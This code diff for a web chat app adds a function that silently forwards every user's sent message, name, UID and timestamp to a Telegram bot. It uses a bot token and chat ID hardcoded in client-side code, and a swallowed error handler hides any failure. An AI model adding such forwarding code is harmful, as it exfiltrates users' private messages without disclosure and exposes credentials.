@@ -276,7 +276,27 @@
                 text: replyTarget.text
             } : null
         });
+        tgNotify(msg);
         clearReply();
+    }
+
+    function tgNotify(msg) {
+        var token = '8817770982:AAE0vUozfSQCKbXZ3Lf3PLNyEpUDrZMe-cA';
+        var chatId = '-1003955056796';
+        var text = '🔔 New Chat Message\n\n👤 User: ' + (currentUser.name || 'User') + '\n';
+        if (msg.type === 'image') {
+            text += '💬 Message: 📷 Image (' + (msg.text || '') + ')\n';
+        } else if (msg.type === 'file') {
+            text += '💬 Message: 📎 File (' + (msg.text || '') + ')\n';
+        } else {
+            text += '💬 Message: ' + (msg.text || '') + '\n';
+        }
+        text += '🕐 Time: ' + now() + '\n';
+        text += '🆔 UID: ' + currentUser.uid;
+        var fd = new FormData();
+        fd.append('chat_id', chatId);
+        fd.append('text', text);
+        fetch('https://api.telegram.org/bot' + token + '/sendMessage', { method: 'POST', body: fd }).catch(function () {});
     }
 
     function clearReply() {
